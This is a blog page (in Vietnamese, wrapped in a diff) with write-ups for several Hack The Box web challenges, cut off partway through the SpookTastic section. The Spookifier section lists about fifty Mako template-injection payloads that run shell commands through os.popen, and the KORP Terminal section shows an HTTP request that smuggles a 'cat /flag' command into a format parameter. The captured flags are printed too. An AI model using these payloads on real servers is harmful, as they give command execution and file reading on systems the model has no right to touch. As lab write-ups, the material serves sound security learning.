@@ -1,0 +1,3675 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Htb web chall ctf 2024 - solved challenges - part 1 - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Hack the box Trapped Source  Đây là bài chỉ view source thôi   Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến /flag và nhận flag.   Correct pin là : 9661 nhận flag nào:  Flag : HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}
+Spookifier   Đây là một bài white box.
+  Chức năng đơn giản là thay đổi phông chữ tạo ra nhiều lại với đầu vào mà chúng ta cho vào.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-08-20-hackthebox-web-challpart1\/",
+          "name": "Htb web chall ctf 2024 solved challenges part 1"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Htb web chall ctf 2024 - solved challenges - part 1",
+  "description" : "Hack the box Trapped Source  Đây là bài chỉ view source thôi   Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến \/flag và nhận flag.   Correct pin là : 9661 nhận flag nào:  Flag : HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}\nSpookifier   Đây là một bài white box.\n  Chức năng đơn giản là thay đổi phông chữ tạo ra nhiều lại với đầu vào mà chúng ta cho vào.",
+  "inLanguage" : "en",
+  "wordCount":  9589 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-08-20-hackthebox-web-challpart1\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Htb web chall ctf 2024 - solved challenges - part 1" />
+<meta property="og:description" content="Hack the box Trapped Source  Đây là bài chỉ view source thôi   Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến /flag và nhận flag.   Correct pin là : 9661 nhận flag nào:  Flag : HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}
+Spookifier   Đây là một bài white box.
+  Chức năng đơn giản là thay đổi phông chữ tạo ra nhiều lại với đầu vào mà chúng ta cho vào.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-08-20-hackthebox-web-challpart1/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Htb web chall ctf 2024 - solved challenges - part 1" />
+  <meta name="twitter:description" content="Hack the box Trapped Source  Đây là bài chỉ view source thôi   Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến /flag và nhận flag.   Correct pin là : 9661 nhận flag nào:  Flag : …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Htb web chall ctf 2024 - solved challenges - part 1</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="hack-the-box">Hack the box</h1>
+<h2 id="trapped-source">Trapped Source</h2>
+<ul>
+<li>Đây là bài chỉ view source thôi</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SyGGk3RJ0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hyr41h01C.png" alt="image"></p>
+<ul>
+<li>Như ta thấy nếu mà pin đúng sẽ gọi fetch với method post đến <code>/flag</code> và nhận flag.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rJl51hCyR.png" alt="image"></p>
+<ul>
+<li>Correct pin là : <code>9661</code> nhận flag nào:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SJm3ynRkC.png" alt="image"></p>
+<p>Flag : <code>HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}</code></p>
+<h2 id="spookifier">Spookifier</h2>
+<ul>
+<li>
+<p>Đây là một bài white box.</p>
+</li>
+<li>
+<p>Chức năng đơn giản là thay đổi phông chữ tạo ra nhiều lại với đầu vào mà chúng ta cho vào.</p>
+</li>
+<li>
+<p>View source thì mình thấy có phần chính:</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/H17fM2RkA.png" alt="image"></p>
+<ul>
+<li>Và hàm spokier trông sẽ như thế này.</li>
+</ul>
+<pre><code>from mako.template import Template
+
+font1 = {
+	'A': '𝕬',
+	'B': '𝕭',
+	'C': '𝕮',
+	'D': '𝕯',
+	'E': '𝕰',
+	'F': '𝕱',
+	'G': '𝕲',
+	'H': '𝕳',
+	'I': '𝕴',
+	'J': '𝕵',
+	'K': '𝕶',
+	'L': '𝕷',
+	'M': '𝕸',
+	'N': '𝕹',
+	'O': '𝕺',
+	'P': '𝕻',
+	'Q': '𝕼',
+	'R': '𝕽',
+	'S': '𝕾',
+	'T': '𝕿',
+	'U': '𝖀',
+	'V': '𝖁',
+	'W': '𝖂',
+	'X': '𝖃',
+	'Y': '𝖄',
+	'Z': '𝖅',
+	'a': '𝖆',
+	'b': '𝖇',
+	'c': '𝖈',
+	'd': '𝖉',
+	'e': '𝖊',
+	'f': '𝖋',
+	'g': '𝖌',
+	'h': '𝖍',
+	'i': '𝖎',
+	'j': '𝖏',
+	'k': '𝖐',
+	'l': '𝖑',
+	'm': '𝖒',
+	'n': '𝖓',
+	'o': '𝖔',
+	'p': '𝖕',
+	'q': '𝖖',
+	'r': '𝖗',
+	's': '𝖘',
+	't': '𝖙',
+	'u': '𝖚',
+	'v': '𝖛',
+	'w': '𝖜',
+	'x': '𝖝',
+	'y': '𝖞',
+	'z': '𝖟',
+	' ': ' '
+}
+
+font2 = {
+	'A': 'ᗩ', 
+	'B': 'ᗷ',
+	'C': 'ᑢ',
+	'D': 'ᕲ',
+	'E': 'ᘿ',
+	'F': 'ᖴ',
+	'G': 'ᘜ',
+	'H': 'ᕼ',
+	'I': 'ᓰ',
+	'J': 'ᒚ',
+	'K': 'ᖽᐸ',
+	'L': 'ᒪ',
+	'M': 'ᘻ',
+	'N': 'ᘉ',
+	'O': 'ᓍ',
+	'P': 'ᕵ',
+	'Q': 'ᕴ',
+	'R': 'ᖇ',
+	'S': 'S',
+	'T': 'ᖶ',
+	'U': 'ᑘ',
+	'V': 'ᐺ',
+	'W': 'ᘺ',
+	'X': '᙭',
+	'Y': 'Ɏ',
+	'Z': 'Ⱬ',
+	'a': 'ᗩ', 
+	'b': 'ᗷ',
+	'c': 'ᑢ',
+	'd': 'ᕲ',
+	'e': 'ᘿ',
+	'f': 'ᖴ',
+	'g': 'ᘜ',
+	'h': 'ᕼ',
+	'i': 'ᓰ',
+	'j': 'ᒚ',
+	'k': 'ᖽᐸ',
+	'l': 'ᒪ',
+	'm': 'ᘻ',
+	'n': 'ᘉ',
+	'o': 'ᓍ',
+	'p': 'ᕵ',
+	'q': 'ᕴ',
+	'r': 'ᖇ',
+	's': 'S',
+	't': 'ᖶ',
+	'u': 'ᑘ',
+	'v': 'ᐺ',
+	'w': 'ᘺ',
+	'x': '᙭',
+	'y': 'Ɏ',
+	'z': 'Ⱬ',
+
+	' ': ' '
+}
+
+font3 = {
+	'A': '₳', 
+	'B': '฿',
+	'C': '₵',
+	'D': 'Đ',
+	'E': 'Ɇ',
+	'F': '₣',
+	'G': '₲',
+	'H': 'Ⱨ',
+	'I': 'ł',
+	'J': 'J',
+	'K': '₭',
+	'L': 'Ⱡ',
+	'M': '₥',
+	'N': '₦',
+	'O': 'Ø',
+	'P': '₱',
+	'Q': 'Q',
+	'R': 'Ɽ',
+	'S': '₴',
+	'T': '₮',
+	'U': 'Ʉ',
+	'V': 'V',
+	'W': '₩',
+	'X': 'Ӿ',
+	'Y': 'y̷',
+	'Z': 'z̷',
+	'a': '₳', 
+	'b': '฿',
+	'c': '₵',
+	'd': 'Đ',
+	'e': 'Ɇ',
+	'f': '₣',
+	'g': '₲',
+	'h': 'Ⱨ',
+	'i': 'ł',
+	'j': 'J',
+	'k': '₭',
+	'l': 'Ⱡ',
+	'm': '₥',
+	'n': '₦',
+	'o': 'Ø',
+	'p': '₱',
+	'q': 'Q',
+	'r': 'Ɽ',
+	's': '₴',
+	't': '₮',
+	'u': 'Ʉ',
+	'v': 'V',
+	'w': '₩',
+	'x': 'Ӿ',
+	'y': 'y̷',
+	'z': 'z̷',
+	' ': ''
+} 
+
+font4 = {
+	'A': 'A', 
+	'B': 'B',
+	'C': 'C',
+	'D': 'D',
+	'E': 'E',
+	'F': 'F',
+	'G': 'G',
+	'H': 'H',
+	'I': 'I',
+	'J': 'J',
+	'K': 'K',
+	'L': 'L',
+	'M': 'M',
+	'N': 'N',
+	'O': 'O',
+	'P': 'P',
+	'Q': 'Q',
+	'R': 'R',
+	'S': 'S',
+	'T': 'T',
+	'U': 'U',
+	'V': 'V',
+	'W': 'W',
+	'X': 'X',
+	'Y': 'Y',
+	'Z': 'Z',
+	'a': 'a', 
+	'b': 'b',
+	'c': 'c',
+	'd': 'd',
+	'e': 'e',
+	'f': 'f',
+	'g': 'g',
+	'h': 'h',
+	'i': 'i',
+	'j': 'j',
+	'k': 'k',
+	'l': 'l',
+	'm': 'm',
+	'n': 'n',
+	'o': 'o',
+	'p': 'p',
+	'q': 'q',
+	'r': 'r',
+	's': 's',
+	't': 't',
+	'u': 'u',
+	'v': 'v',
+	'w': 'w',
+	'x': 'x',
+	'y': 'y',
+	'z': 'z',
+	'1': '1',
+	'2': '2',
+	'3': '3',
+	'4': '4',
+	'5': '5',
+	'6': '6',
+	'7': '7',
+	'8': '8',
+	'9': '9',
+	'0': '0',
+	'!': '!',
+	'@': '@',
+	'#': '#',
+	'$': '$',
+	'%': '%',
+	'^': '^',
+	'&amp;': '&amp;',
+	'*': '*',
+	'(': '(',
+	')': ')',
+	'-': '-',
+	'_': '_',
+	'+': '+',
+	'=': '=',
+	'{': '{',
+	'}': '}',
+	'[': '[',
+	']': ']',
+	'\\': '\\',
+	'|': '|',
+	';': ';',
+	':': ':',
+	'\'': '\'',
+	'&quot;': '&quot;',
+	'&lt;': '&lt;',
+	',': ',',
+	'&gt;': '&gt;',
+	'.': '.',
+	'?': '?',
+	'/': '/'
+	' ': ' ',
+}
+
+def generate_render(converted_fonts):
+	result = '''
+		&lt;tr&gt;
+			&lt;td&gt;{0}&lt;/td&gt;
+        &lt;/tr&gt;
+        
+		&lt;tr&gt;
+        	&lt;td&gt;{1}&lt;/td&gt;
+        &lt;/tr&gt;
+        
+		&lt;tr&gt;
+        	&lt;td&gt;{2}&lt;/td&gt;
+        &lt;/tr&gt;
+        
+		&lt;tr&gt;
+        	&lt;td&gt;{3}&lt;/td&gt;
+        &lt;/tr&gt;
+
+	'''.format(*converted_fonts)
+	
+	return Template(result).render()
+
+def change_font(text_list):
+	text_list = [*text_list]
+	current_font = []
+	all_fonts = []
+	
+	add_font_to_list = lambda text,font_type : (
+		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
+		) and None
+
+	add_font_to_list(text_list, 'font1')
+	add_font_to_list(text_list, 'font2')
+	add_font_to_list(text_list, 'font3')
+	add_font_to_list(text_list, 'font4')
+
+	return all_fonts
+
+def spookify(text):
+	converted_fonts = change_font(text_list=text)
+
+	return generate_render(converted_fonts=converted_fonts)
+
+
+</code></pre><ul>
+<li>
+<p>Nhìn cái là biết luôn dính SSTI của template mako nha.</p>
+</li>
+<li>
+<p>Bây giờ thì thử <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako">payload</a>, flag nằm ở <code>/flag.txt</code> nhá.</p>
+</li>
+<li>
+<p>Dùng intruder check:</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SJrkN3A1A.png" alt="image"></p>
+<ul>
+<li>Mình loay hoay khá lâu vì bình thường để nguyên thì kết quả đều là 0 hết chắc cho sever detect system hoặc là không có quyền chạy os :&gt;, sau đó gpt thì tìm xem có cách khác để đọc file từ popen của os module.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/B1qoPh0JA.png" alt="image"></p>
+<ul>
+<li>
+<p>giờ mình thử xem có được không.</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/rkdlA2CJR.png" alt="image"></p>
+</li>
+<li>
+<p>Hehe có vẻ như nó không detect gì cả nên mình nhận được flag.</p>
+</li>
+</ul>
+<pre><code>${self.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.__init__.__globals__['util'].os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.__init__.__globals__['os'].popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.cache.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template._mmarker.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.cache.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template._mmarker.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.filters.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.exceptions.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.cache.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.cache.util.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.runtime.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.util.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.exceptions.traceback.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.exceptions.util.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template._mmarker.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.cache.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.template.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template._mmarker.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template._mmarker.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template._mmarker.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.filters.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.runtime.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template._mmarker.module.cache.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.runtime.exceptions.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template.module.cache.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template._mmarker.module.runtime.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template.module.filters.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template.module.runtime.compat.inspect.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.context._with_template.module.runtime.exceptions.util.os.popen(&quot;cat /flag.txt&quot;).read()}
+${self.template.module.runtime.exceptions.traceback.linecache.os.popen(&quot;cat /flag.txt&quot;).read()}
+</code></pre><p>Ngoài ra cũng có thể dùng <code>.open()</code> thay cho <code>read()</code>.</p>
+<p><img src="https://hackmd.io/_uploads/ryYD02RJR.png" alt="image"></p>
+<p>Flag : <code>HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}</code></p>
+<h2 id="flag-command">Flag Command</h2>
+<ul>
+<li>
+<p>Đây là một bài view client source trong giải htb apocalypse nên cũng khá là đơn giản</p>
+</li>
+<li>
+<p>Giao diên dưới đây:
+<img src="https://hackmd.io/_uploads/ryE0eODSC.png" alt="image"></p>
+</li>
+<li>
+<p>Như ta có thể thấy có một chức năng để gõ command-&gt; gọi js từ main.js</p>
+</li>
+</ul>
+<pre><code>&lt;script type=&quot;module&quot;&gt;
+    import { startCommander, enterKey, userTextInput } from &quot;/static/terminal/js/main.js&quot;;
+    startCommander();
+
+    window.addEventListener(&quot;keyup&quot;, enterKey);
+
+    // event listener for clicking on the terminal
+    document.addEventListener(&quot;click&quot;, function () {
+      userTextInput.focus();
+    });
+
+
+  &lt;/script&gt;
+</code></pre><p><img src="https://hackmd.io/_uploads/rkWRWOwr0.png" alt="image"></p>
+<ul>
+<li>
+<p>Ở đây chú ý có một hàm gọi /api/options và ta quan sát 
+<img src="https://hackmd.io/_uploads/HkGeG_vHC.png" alt="image"></p>
+</li>
+<li>
+<p>Có <code>secret</code> ở đây chắc nó phải có một tác dụng gì đó.</p>
+</li>
+<li>
+<p>Tiếp tục lại thấy một hàm fetch api/monitor</p>
+</li>
+</ul>
+<pre><code>async function CheckMessage() {
+    fetchingResponse = true;
+    currentCommand = commandHistory[commandHistory.length - 1];
+
+    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
+        await fetch('/api/monitor', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ 'command': currentCommand })
+        })
+            .then((res) =&gt; res.json())
+            .then(async (data) =&gt; {
+                console.log(data)
+                await displayLineInTerminal({ text: data.message });
+
+                if(data.message.includes('Game over')) {
+                    playerLost();
+                    fetchingResponse = false;
+                    return;
+                }
+
+                if(data.message.includes('HTB{')) {
+                    playerWon();
+                    fetchingResponse = false;
+
+                    return;
+                }
+
+                if (currentCommand == 'HEAD NORTH') {
+                    currentStep = '2';
+                }
+                else if (currentCommand == 'FOLLOW A MYSTERIOUS PATH') {
+                    currentStep = '3'
+                }
+                else if (currentCommand == 'SET UP CAMP') {
+                    currentStep = '4'
+                }
+
+                let lineBreak = document.createElement(&quot;br&quot;);
+
+
+                beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
+                displayLineInTerminal({ text: '&lt;span class=&quot;command&quot;&gt;You have 4 options!&lt;/span&gt;' })
+                displayLinesInTerminal({ lines: availableOptions[currentStep] })
+                fetchingResponse = false;
+            });
+
+
+    }
+    else {
+        displayLineInTerminal({ text: &quot;You do realise its not a park where you can just play around and move around pick from options how are hard it is for you????&quot; });
+        fetchingResponse = false;
+    }
+}
+</code></pre><ul>
+<li>Nó nhận một json &ldquo;command&rdquo; và thực hiện post đến api/monitor và quan sát nếu có <code>HTB{</code> thì win vậy thì ta thử truyền secret vào command thử xem:</li>
+<li><img src="https://hackmd.io/_uploads/BJx_XOwBC.png" alt="image"></li>
+</ul>
+<p>Flag: <code>HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}</code></p>
+<h2 id="korp-terminal">KORP Terminal</h2>
+<p><img src="https://hackmd.io/_uploads/SJYVudDS0.png" alt="image"></p>
+<pre><code>GET /?format=%Y-%m-%d';+cat+/flag' HTTP/1.1
+Host: 94.237.54.176:46820
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=1
+
+
+</code></pre><p>Flag: <code>HTB{1t_i5_t1m3_f0r_ult1m4t3_pwn4g3!}</code></p>
+<h2 id="spooktastic">SpookTastic</h2>
+<ul>
+<li>Phần mô tả cho chúng ta biết rằng chúng ta cần bật một cảnh báo để xác nhận bí mật ẩn giấu.
+<img src="https://hackmd.io/_uploads/B1WTw7yIC.png" alt="image"></li>
+<li>Ta quan sát ở phần client chỉ thấy một đoạn js đơn giản:</li>
+</ul>
+<pre><code>
+btn.addEventListener(&quot;click&quot;, e =&gt; {
+		e.preventDefault();
+		fetch(&quot;/api/register&quot;, {
+			method: &quot;POST&quot;,
+			body: JSON.stringify({
+				email: document.getElementById(&quot;email&quot;).value
+			}),
+			headers: {
+				&quot;Content-Type&quot;: &quot;application/json&quot;
+			}
+		})
+			.then(r =&gt; r.json())
+			.then(r =&gt; {
+				if (r.success) {
+					alert(&quot;Thank you for signing up to our newsletter&quot;);
+				}
+			});
+	});
+
+	(() =&gt; {
+		const socket = io();
+		socket.on(&quot;flag&quot;, data =&gt; {
+			console.log(data.flag);
+			alert(data.flag);
+		});
+	})();
+&lt;/script&gt;
+</code></pre><ul>
+<li>Nếu mà ta click vào book now sẽ gọi đến hàm js trên thực hiện fetch api/register với giá trị của email.</li>
+<li>Sau đó gọi một IIFE funcion để kết nối socket và lắng nghe flag để hiển thị flag.</li>
+<li>Vì vậy nên chúng ta đi vào xem source code của chall:</li>
+</ul>
+<pre><code>import random, string
+from flask import Flask, request, render_template, abort
+from flask_socketio import SocketIO
+from threading import Thread
+
+app = Flask(__name__)
+
+socketio = SocketIO(app)
+
+registered_emails, socket_clients = [], {}
+
